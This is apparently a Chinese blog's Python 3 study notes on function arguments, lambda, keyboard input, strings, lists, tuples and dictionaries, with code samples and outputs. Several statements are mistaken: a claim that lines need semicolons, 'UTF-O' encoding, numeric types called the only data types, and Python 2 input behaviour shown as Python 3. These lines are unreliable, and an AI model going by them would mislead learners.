<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#可写函数说明</span></span><br><span class="line">def printinfo( name, age = 35 ):</span><br><span class="line">   <span class="string">"打印任何传入的字符串"</span></span><br><span class="line">   <span class="builtin-name">print</span>(<span class="string">"Name: "</span>, name)</span><br><span class="line">   <span class="builtin-name">print</span>(<span class="string">"Age "</span>, age)</span><br><span class="line">   return</span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用printinfo函数</span></span><br><span class="line">printinfo( <span class="attribute">age</span>=50, <span class="attribute">name</span>=<span class="string">"miki"</span> )</span><br><span class="line">printinfo( <span class="attribute">name</span>=<span class="string">"miki"</span> )</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">Name:  miki</span><br><span class="line">Age  50</span><br><span class="line">Name:  miki</span><br><span class="line">Age  35</span><br></pre></td></tr></table></figure>
<h3 id="不定长参数"><a href="#不定长参数" class="headerlink" title="不定长参数"></a>不定长参数</h3><p>你可能需要一个函数能处理比当初声明时更多的参数。这些参数叫做不定长参数，和上述2种参数不同，声明时不会命名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span><span class="params">( arg1, *vartuple )</span>:</span></span><br><span class="line">   <span class="string">"打印任何传入的参数"</span></span><br><span class="line">   print(<span class="string">"输出: "</span>)</span><br><span class="line">   print(arg1)</span><br><span class="line">   <span class="keyword">for</span> var <span class="keyword">in</span> vartuple:</span><br><span class="line">      print(var)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用printinfo 函数</span></span><br><span class="line">printinfo( <span class="number">10</span> )</span><br><span class="line">printinfo( <span class="number">70</span>, <span class="number">60</span>, <span class="number">50</span> )</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">输出:</span><br><span class="line"><span class="number">10</span></span><br><span class="line">输出:</span><br><span class="line"><span class="number">70</span></span><br><span class="line"><span class="number">60</span></span><br><span class="line"><span class="number">50</span></span><br></pre></td></tr></table></figure>
<h2 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h2><p>python使用lambda来创建匿名函数</p>
<p>lambda是一个表达式，比def简单很多</p>
<p>lambda由于简单，所以只能封装有限的逻辑</p>
<p>lambda拥有自己的命名空间</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line"># 可写函数说明</span><br><span class="line"><span class="built_in">sum</span> = <span class="built_in">lambda</span> arg1, arg2: arg1 + arg2</span><br><span class="line"> </span><br><span class="line"># 调用<span class="built_in">sum</span>函数</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"相加后的值为 : "</span>, <span class="built_in">sum</span>( <span class="number">10</span>, <span class="number">20</span> ))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"相加后的值为 : "</span>, <span class="built_in">sum</span>( <span class="number">20</span>, <span class="number">20</span> ))</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">相加后的值为 :  <span class="number">30</span></span><br><span class="line">相加后的值为 :  <span class="number">40</span></span><br></pre></td></tr></table></figure>
<h1 id="文件I-O"><a href="#文件I-O" class="headerlink" title="文件I/O"></a>文件I/O</h1><h2 id="打印到屏幕"><a href="#打印到屏幕" class="headerlink" title="打印到屏幕"></a>打印到屏幕</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"Python 是一个非常棒的语言，不是吗？"</span>)</span></span></span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">Python 是一个非常棒的语言，不是吗？</span><br></pre></td></tr></table></figure>
<h2 id="读取键盘输入"><a href="#读取键盘输入" class="headerlink" title="读取键盘输入"></a>读取键盘输入</h2><p>分为raw_input函数和input函数</p>
<h3 id="raw-input函数"><a href="#raw-input函数" class="headerlink" title="raw_input函数"></a>raw_input函数</h3><p> 函数从标准输入读取一个行，并返回一个字符串<br> <figure class="highlight hsp"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">str</span> = raw_input(<span class="string">"请输入："</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"你输入的内容是: "</span>, <span class="keyword">str</span></span><br><span class="line"></span><br><span class="line">输入为：</span><br><span class="line">Hello Python！</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">请输入：Hello Python！</span><br><span class="line">你输入的内容是:  Hello Python！</span><br></pre></td></tr></table></figure></p>
<h3 id="input函数"><a href="#input函数" class="headerlink" title="input函数"></a>input函数</h3><p>使用基本类似，但是可以接受一个python表达式作为输入<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">str = input(<span class="string">"请输入："</span>)</span><br><span class="line">print <span class="string">"你输入的内容是: "</span>, str</span><br><span class="line"></span><br><span class="line">输入为：</span><br><span class="line">[x*<span class="number">5</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">10</span>,<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">请输入：[x*<span class="number">5</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">10</span>,<span class="number">2</span>)]</span><br><span class="line">你输入的内容是:  [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>]</span><br></pre></td></tr></table></figure></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.当不知道循环次数时，使用while语句并没和break或continue等控制语句使用，注意避免死循环</p>
<p>2.函数定义时，要注意是否带有参数，如果带有需要用return进行返回，（）中不填则视为无参函数</p>
<p>3.关键字函数，类似于字典中的key，使用键值对的方法来确定变量，相比JAVA和C语言等更加灵活</p>
<p>4.python允许创建匿名函数，但是需要使用lambda关键字，由于使用较为简单，所以只能封装一些简单操作</p>
<p>5.raw_input只能接受一行字符串，input可以接受符合Python语法的表达式进行进一步操作</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Python3开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-2020/2/22-基础1</title>
    <url>/2020/02/22/Python/</url>
    <content><![CDATA[<h1 id="Python3基础语法"><a href="#Python3基础语法" class="headerlink" title="Python3基础语法"></a>Python3基础语法</h1><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>默认情况下，Python3源码文件以UTF-O编码，所有的字符串都是unicode字符串。</p>
<h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><p>第一个字符必须是字母或下划线_<br>其他部分由字母，数字和下划线组成<br>大小写敏感</p>
<h2 id="python保留字"><a href="#python保留字" class="headerlink" title="python保留字"></a>python保留字</h2><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">'False', 'None', 'True', 'and', 'as', 'assert', 'break', 'class', 'continue', 'def', 'del', 'elif', 'else', 'except', 'finally', 'for', 'from', 'global', 'if', 'import', 'in', 'is', 'lambda', 'nonlocal', 'not', 'or', 'pass', 'raise', 'return', 'try', 'while', 'with', 'yield'</span><br></pre></td></tr></table></figure>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>#为单行注释<br>多行注释可以使用多个#，’’’和”””</p>
<h2 id="行与缩进"><a href="#行与缩进" class="headerlink" title="行与缩进"></a>行与缩进</h2><p>由于python的特色，需要分号作为结尾，也不需要{}来表示代码块，所以缩进尤为重要，是python区分不同代码块的重要环节；缩进的空格数可变，同一个代码块必须包含相同的缩进空格数<br>例如：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"True"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"False"</span>)</span><br></pre></td></tr></table></figure></p>
<h2 id="多行语句"><a href="#多行语句" class="headerlink" title="多行语句"></a>多行语句</h2><p>python通常是一行写完，如果语句很长，使用<code>\</code>反斜杠来实现多行语句</p>
<p>在[].{}.()中的多行语句不需要反斜杠</p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>python有四种数据类型：整型，布尔型，浮点数和复数<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">int</span><span class="params">(整型)</span></span>  如<span class="number">1</span></span><br><span class="line"><span class="function"><span class="title">bool</span><span class="params">(布尔)</span></span>  如ture</span><br><span class="line"><span class="function"><span class="title">float</span><span class="params">(浮点数)</span></span>  如<span class="number">1.23</span></span><br><span class="line"><span class="function"><span class="title">complex</span><span class="params">(复数)</span></span>  如<span class="number">1</span>+<span class="number">2</span>j</span><br></pre></td></tr></table></figure></p>
<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>python中单引号与双引号使用相同</p>
<p>三引号<code>&#39;&#39;&#39;</code>可以指定一个多行字符串</p>
<p>转义符<code>\</code></p>
<p>反斜杠可以转义，使用r可以让反斜杠不发生转义。如r”this is a line with \n” \n会正常显示 而不是换行</p>
<p>按字面意义级联字符串。如”this””is””string”会被自动转换为this is string</p>
<p>字符串可以用+连接，用*重复</p>
<p>python中字符串有两种索引方式，从左开始以0开始，从右开始以-1开始</p>
<p>字符串不可以改变</p>
<p>没有单独的字符类型，一个字符就是长度为1的字符串</p>
<p>字符串截取的语法格式为：<code>变量[头下标:尾下标:步长]</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str=<span class="string">'Runoob'</span></span><br><span class="line"></span><br><span class="line">print(str)  	<span class="comment">#输出字符串</span></span><br><span class="line">print(str[<span class="number">0</span>:<span class="number">-1</span>]) 	<span class="comment">#输出第一个到倒数第二个的所有字符</span></span><br><span class="line">print(str[<span class="number">0</span>]) 	<span class="comment">#输出第一个字符</span></span><br><span class="line">print(str[<span class="number">2</span>:<span class="number">5</span>]) 	<span class="comment">#输出从第三个开始到第五个的字符</span></span><br><span class="line">print(str + ‘你好’) 	<span class="comment">#连接字符串</span></span><br><span class="line">print(<span class="string">'hello\nrunoob'</span>) 	<span class="comment">#反斜杠转义</span></span><br><span class="line">print(<span class="string">r'hello\nrunoob'</span>) 	<span class="comment">#在字符串前加一个r，不发生转义</span></span><br></pre></td></tr></table></figure>
<h3 id="访问字符串中的值"><a href="#访问字符串中的值" class="headerlink" title="访问字符串中的值"></a>访问字符串中的值</h3><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">var1 = 'Hello World!'</span><br><span class="line">var2 = <span class="string">"Runoob"</span></span><br><span class="line"> </span><br><span class="line">print (<span class="string">"var1[0]: "</span>, var1[0])</span><br><span class="line">print (<span class="string">"var2[1:5]: "</span>, var2[1:5])</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line"><span class="section">var1[0]:  H</span></span><br><span class="line"><span class="section">var2[1:5]:  unoo</span></span><br></pre></td></tr></table></figure>
<h3 id="字符串更新"><a href="#字符串更新" class="headerlink" title="字符串更新"></a>字符串更新</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">var1 = <span class="string">'Hello World!'</span></span><br><span class="line"> </span><br><span class="line"><span class="builtin-name">print</span> (<span class="string">"已更新字符串 : "</span>, var1[:6] + <span class="string">'Runoob!'</span>)</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">已更新字符串 :  Hello Runoob!</span><br></pre></td></tr></table></figure>
<h3 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h3><figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="literal">+</span><span class="comment">	字符串连接	a</span> <span class="literal">+</span> <span class="comment">b</span> <span class="comment">输出结果：</span> <span class="comment">HelloPython</span></span><br><span class="line"><span class="comment">*	重复输出字符串	a*2</span> <span class="comment">输出结果：HelloHello</span></span><br><span class="line"><span class="comment"></span><span class="title">[</span><span class="title">]</span><span class="comment">	通过索引获取字符串中字符	a</span><span class="title">[</span><span class="comment">1</span><span class="title">]</span> <span class="comment">输出结果</span> <span class="comment">e</span></span><br></pre></td></tr></table></figure>
<p>例如：<br><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="keyword">a</span> = <span class="string">"Hello"</span></span><br><span class="line">b = <span class="string">"Python"</span></span><br><span class="line"> </span><br><span class="line">print(<span class="string">"a + b 输出结果："</span>, <span class="keyword">a</span> + b)</span><br><span class="line">print(<span class="string">"a * 2 输出结果："</span>, <span class="keyword">a</span> * <span class="number">2</span>)</span><br><span class="line">print(<span class="string">"a[1] 输出结果："</span>, <span class="keyword">a</span>[<span class="number">1</span>])</span><br><span class="line">print(<span class="string">"a[1:4] 输出结果："</span>, <span class="keyword">a</span>[<span class="number">1</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line"><span class="keyword">a</span> + b 输出结果： HelloPython</span><br><span class="line"><span class="keyword">a</span> * <span class="number">2</span> 输出结果： HelloHello</span><br><span class="line"><span class="keyword">a</span>[<span class="number">1</span>] 输出结果： e</span><br><span class="line"><span class="keyword">a</span>[<span class="number">1</span>:<span class="number">4</span>] 输出结果： ell</span><br></pre></td></tr></table></figure></p>
<h3 id="三引号"><a href="#三引号" class="headerlink" title="三引号"></a>三引号</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">para_str = <span class="string">"""这是一个多行字符串的实例</span></span><br><span class="line"><span class="string">多行字符串可以使用制表符</span></span><br><span class="line"><span class="string">TAB ( \t )。</span></span><br><span class="line"><span class="string">也可以使用换行符 [ \n ]。</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">print</span> (para_str</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">这是一个多行字符串的实例</span><br><span class="line">多行字符串可以使用制表符</span><br><span class="line">TAB (    )。</span><br><span class="line">也可以使用换行符 [ </span><br><span class="line"> ]。</span><br></pre></td></tr></table></figure>
<h3 id="常用字符串函数"><a href="#常用字符串函数" class="headerlink" title="常用字符串函数"></a>常用字符串函数</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">capitalize()  第一个字符转大写</span><br><span class="line"></span><br><span class="line">center(width,fillchar)  指定一个宽度width居中的字符串，fillchar位填充的字符，默认为空格</span><br><span class="line"></span><br><span class="line">count(str,beg=0,<span class="keyword">end</span>=<span class="keyword">len</span>(<span class="keyword">string</span>))  返回<span class="keyword">str</span>在<span class="keyword">string</span>中出现的次数，beg和<span class="keyword">end</span>可以指定范围</span><br><span class="line"></span><br><span class="line"><span class="keyword">encode</span>(<span class="keyword">encoding</span>=<span class="string">'UTF-8'</span>,<span class="keyword">errors</span>=<span class="string">'strict'</span>)  以<span class="keyword">encoding</span>指定的编码格式编码字符串</span><br><span class="line"></span><br><span class="line">find(<span class="keyword">str</span>,beg=<span class="number">0</span>,<span class="keyword">end</span>=<span class="keyword">len</span>(<span class="keyword">string</span>))  查找<span class="keyword">str</span>字符是否在<span class="keyword">string</span>中，beg和<span class="keyword">end</span>指定范围</span><br><span class="line"></span><br><span class="line"><span class="keyword">upper</span>()  小写转大写</span><br><span class="line"></span><br><span class="line"><span class="keyword">lower</span>()  大写转小写</span><br><span class="line"></span><br><span class="line">swapcase()  将字符串中大写转换为小写，小写转换为大写</span><br><span class="line"></span><br><span class="line">islower()  如果字符串中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是小写，则返回 <span class="literal">True</span>，否则返回 <span class="literal">False</span></span><br><span class="line">isupper()  类似</span><br><span class="line"></span><br><span class="line"><span class="keyword">len</span>()  返回字符串长度</span><br><span class="line"></span><br><span class="line"><span class="keyword">max</span>(<span class="keyword">str</span>)  返回最大值</span><br><span class="line"><span class="keyword">min</span>类似</span><br><span class="line"></span><br><span class="line"><span class="keyword">replace</span>(<span class="keyword">old</span>,<span class="keyword">new</span>[,<span class="keyword">max</span>])  把字符串中的str1转换成str2，如果<span class="keyword">max</span>指定，替换不超过<span class="keyword">max</span>次</span><br><span class="line"></span><br><span class="line"><span class="keyword">split</span>(<span class="keyword">str</span><span class="string">""</span>,<span class="keyword">num</span>=string.count(<span class="keyword">str</span>))  以<span class="keyword">str</span>为分隔符截取字符串</span><br></pre></td></tr></table></figure>
<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>类似于一个数组</p>
<h3 id="访问列表中的值"><a href="#访问列表中的值" class="headerlink" title="访问列表中的值"></a>访问列表中的值</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="string">'Google'</span>, <span class="string">'Runoob'</span>, <span class="number">1997</span>, <span class="number">2000</span>];</span><br><span class="line">list2 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span> ];</span><br><span class="line"> </span><br><span class="line">print (<span class="string">"list1[0]: "</span>, list1[<span class="number">0</span>])</span><br><span class="line">print (<span class="string">"list2[1:5]: "</span>, list2[<span class="number">1</span>:<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">list1[<span class="number">0</span>]:  Google</span><br><span class="line">list2[<span class="number">1</span>:<span class="number">5</span>]:  [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br></pre></td></tr></table></figure>
<h3 id="删除列表元素"><a href="#删除列表元素" class="headerlink" title="删除列表元素"></a>删除列表元素</h3><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">list</span> = [<span class="string">'Google'</span>, <span class="string">'Runoob'</span>, <span class="number">1997</span>, <span class="number">2000</span>]</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> (<span class="string">"原始列表 : "</span>, <span class="keyword">list</span>)</span><br><span class="line">del <span class="keyword">list</span>[<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">"删除第三个元素 : "</span>, <span class="keyword">list</span>)</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">原始列表 :  [<span class="string">'Google'</span>, <span class="string">'Runoob'</span>, <span class="number">1997</span>, <span class="number">2000</span>]</span><br><span class="line">删除第三个元素 :  [<span class="string">'Google'</span>, <span class="string">'Runoob'</span>, <span class="number">2000</span>]</span><br></pre></td></tr></table></figure>
<h3 id="列表脚本操作符"><a href="#列表脚本操作符" class="headerlink" title="列表脚本操作符"></a>列表脚本操作符</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">len([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])   结果为<span class="number">3</span> 显示列表的长度</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]+[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]  结果为[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>] 组合</span><br><span class="line"></span><br><span class="line">[<span class="string">'hi'</span>]*<span class="number">4</span>   结果为[<span class="string">'Hi!'</span>, <span class="string">'Hi!'</span>, <span class="string">'Hi!'</span>, <span class="string">'Hi!'</span>] 重复</span><br><span class="line"></span><br><span class="line"><span class="number">3</span> <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]   结果为True  元素是否存在于列表中</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]: print(x, end=<span class="string">" "</span>)   结果为<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>  迭代</span><br></pre></td></tr></table></figure>
<h3 id="列表常用函数"><a href="#列表常用函数" class="headerlink" title="列表常用函数"></a>列表常用函数</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">len</span><span class="params">(list)</span></span>  列表元素个数</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">max</span><span class="params">(list)</span></span>  返回列表元素最大值</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">min</span><span class="params">(list)</span></span>  返回列表元素最小值</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">list</span><span class="params">(seq)</span></span>  将元组转换为列表</span><br></pre></td></tr></table></figure>
<h3 id="列表常用方法"><a href="#列表常用方法" class="headerlink" title="列表常用方法"></a>列表常用方法</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">list</span>.<span class="keyword">append</span>(obj)  在末尾添加新的对象</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>.<span class="built_in">count</span>(obj)  统计某个元素出现的个数</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>.<span class="built_in">extend</span>(seq)  在列表末尾一次性追加另一个序列中的多个值</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>.<span class="keyword">insert</span>(<span class="built_in">index</span>,obj)  将对象插入列表</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>.<span class="built_in">remove</span>(obj)  移除列表中某个值的第一个匹配项</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>.<span class="keyword">pop</span>([<span class="built_in">index</span>=-<span class="number">1</span>])  移除列表中的一个元素，并且返回该元素</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>.<span class="keyword">sort</span>(key=None,<span class="built_in">reverse</span>=False)  对列表进行排序</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>.clear()  清空列表</span><br></pre></td></tr></table></figure>
<h2 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h2><p>Python 的元组与列表类似，不同之处在于元组的元素不能修改</p>
<p>元组使用小括号，列表使用方括号</p>
<p>元组创建很简单，只需要在括号中添加元素，并使用逗号隔开即可</p>
<p>元组是不可变的</p>
<h3 id="访问元组"><a href="#访问元组" class="headerlink" title="访问元组"></a>访问元组</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">tup1 = (<span class="string">'Google'</span>, <span class="string">'Runoob'</span>, <span class="number">1997</span>, <span class="number">2000</span>)</span><br><span class="line">tup2 = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span> )</span><br><span class="line"> </span><br><span class="line">print (<span class="string">"tup1[0]: "</span>, tup1[<span class="number">0</span>])</span><br><span class="line">print (<span class="string">"tup2[1:5]: "</span>, tup2[<span class="number">1</span>:<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">tup1[<span class="number">0</span>]:  Google</span><br><span class="line">tup2[<span class="number">1</span>:<span class="number">5</span>]:  (<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br></pre></td></tr></table></figure>
<h3 id="删除元组"><a href="#删除元组" class="headerlink" title="删除元组"></a>删除元组</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">tup = (<span class="string">'Google'</span>, <span class="string">'Runoob'</span>, <span class="number">1997</span>, <span class="number">2000</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> (tup)</span><br><span class="line">del tup</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"删除后的元组 tup : "</span>)</span><br><span class="line"><span class="keyword">print</span> (tup)</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">删除后的元组 tup : </span><br><span class="line">Traceback (most recent <span class="keyword">call</span> <span class="keyword">last</span>):</span><br><span class="line">  File <span class="string">"test.py"</span>, <span class="built_in">line</span> <span class="number">8</span>, in <span class="symbol">&lt;module&gt;</span></span><br><span class="line">    <span class="keyword">print</span> (tup)</span><br><span class="line">NameError: name <span class="string">'tup'</span> <span class="keyword">is</span> not defined</span><br></pre></td></tr></table></figure>
<h3 id="元组运算符"><a href="#元组运算符" class="headerlink" title="元组运算符"></a>元组运算符</h3><p>与列表几乎一致</p>
<h3 id="元组常用函数"><a href="#元组常用函数" class="headerlink" title="元组常用函数"></a>元组常用函数</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">tuple</span><span class="params">(iterable)</span></span>  将可迭代系列转换为元组</span><br><span class="line"></span><br><span class="line">其余函数与列表相同</span><br></pre></td></tr></table></figure>
<h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>字典是另一种可变容器模型，且可存储任意类型对象。</p>
<p>字典的每个键值(key=&gt;value)对用冒号(:)分割，每个对之间用逗号(,)分割，整个字典包括在花括号({})中</p>
<h3 id="访问字典里的值"><a href="#访问字典里的值" class="headerlink" title="访问字典里的值"></a>访问字典里的值</h3><figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">dict = &#123;<span class="string">'Name'</span>: <span class="string">'Runoob'</span>, <span class="string">'Age'</span>: <span class="number">7</span>, <span class="string">'Class'</span>: <span class="string">'First'</span>&#125;</span><br><span class="line"> </span><br><span class="line">print (<span class="string">"dict['Name']: "</span>, dict[<span class="string">'Name'</span>])</span><br><span class="line">print (<span class="string">"dict['Age']: "</span>, dict[<span class="string">'Age'</span>])</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">dict[<span class="string">'Name'</span>]:  <span class="symbol">Runoob</span></span><br><span class="line">dict[<span class="string">'Age'</span>]:  <span class="number">7</span></span><br></pre></td></tr></table></figure>
<h3 id="删除字典元素"><a href="#删除字典元素" class="headerlink" title="删除字典元素"></a>删除字典元素</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict = &#123;<span class="string">'Name'</span>: <span class="string">'Runoob'</span>, <span class="string">'Age'</span>: <span class="number">7</span>, <span class="string">'Class'</span>: <span class="string">'First'</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">del</span> dict[<span class="string">'Name'</span>] <span class="comment"># 删除键 'Name'</span></span><br><span class="line">dict.clear()     <span class="comment"># 清空字典</span></span><br><span class="line"><span class="keyword">del</span> dict         <span class="comment"># 删除字典</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> (<span class="string">"dict['Age']: "</span>, dict[<span class="string">'Age'</span>])</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"dict['School']: "</span>, dict[<span class="string">'School'</span>])</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"test.py"</span>, line <span class="number">9</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"dict['Age']: "</span>, dict[<span class="string">'Age'</span>])</span><br><span class="line">TypeError: <span class="string">'type'</span> object <span class="keyword">is</span> <span class="keyword">not</span> subscriptable</span><br></pre></td></tr></table></figure>
<h3 id="字典键的特性"><a href="#字典键的特性" class="headerlink" title="字典键的特性"></a>字典键的特性</h3><p>1）不允许同一个键出现两次。创建时如果同一个键被赋值两次，后一个值会被记住</p>
<p>2）键必须不可变，所以可以用数字，字符串或元组充当，而用列表就不行</p>
<h3 id="字典常用函数"><a href="#字典常用函数" class="headerlink" title="字典常用函数"></a>字典常用函数</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">len</span><span class="params">(dict)</span></span>  计算字典元素个数，即键的总数</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">str</span><span class="params">(dict)</span></span>  输出字典，以可打印的字符串表示</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">type</span><span class="params">(variable)</span></span>  返回输入的变量类型，如果变量是字典就返回字典类型</span><br></pre></td></tr></table></figure>
<h3 id="字典常用方法"><a href="#字典常用方法" class="headerlink" title="字典常用方法"></a>字典常用方法</h3><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">radiansdict</span><span class="selector-class">.clear</span>()  删除字典内所有元素</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">radiansdict</span><span class="selector-class">.get</span>(key, default=None)  返回指定键的值，如果值不在字典中返回<span class="selector-tag">default</span>值</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">radiansdict</span><span class="selector-class">.items</span>()  以列表返回可遍历的(键, 值) 元组数组</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">radiansdict</span><span class="selector-class">.values</span>()  返回一个迭代器，可以使用 <span class="selector-tag">list</span>() 来转换为列表</span><br></pre></td></tr></table></figure>
<h2 id="用户输入"><a href="#用户输入" class="headerlink" title="用户输入"></a>用户输入</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">input(<span class="string">"\n\n按下enter键后退出"</span>)</span><br></pre></td></tr></table></figure>
<h2 id="同一行显示多条语句"><a href="#同一行显示多条语句" class="headerlink" title="同一行显示多条语句"></a>同一行显示多条语句</h2><p>语句之间必须用分号分隔</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys;x=<span class="string">'runoob'</span>;sys.stdout.write(x+<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>
<p>输出结果为：<br><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">runoob</span></span><br></pre></td></tr></table></figure></p>
